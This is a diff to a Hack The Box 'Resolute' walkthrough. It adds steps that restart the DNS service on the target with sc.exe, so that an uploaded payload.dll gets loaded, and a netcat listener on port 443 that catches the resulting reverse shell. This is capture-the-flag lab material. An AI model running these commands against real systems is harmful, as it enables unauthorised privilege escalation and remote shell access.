@@ -239,5 +239,17 @@ Upload the `payload.dll` file.
 ```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/e250d7a8-6133-495a-9b13-9c3eb5ff78ea)
 
-- Netcat Listener
+  - Stop and Start the DNS Service
+```CSS
+▶ sc.exe \\resolute stop dns
+```
+```CSS
+▶ sc.exe \\resolute start dns
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/7cda7e39-4d08-47bf-8e28-a5e5d01b1ad2)
+
+  - Netcat Listener
+```CSS
+▶ nc -nlvvp 443
+```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/43e31f79-f1e0-4902-b9fa-2e48f04588ab)
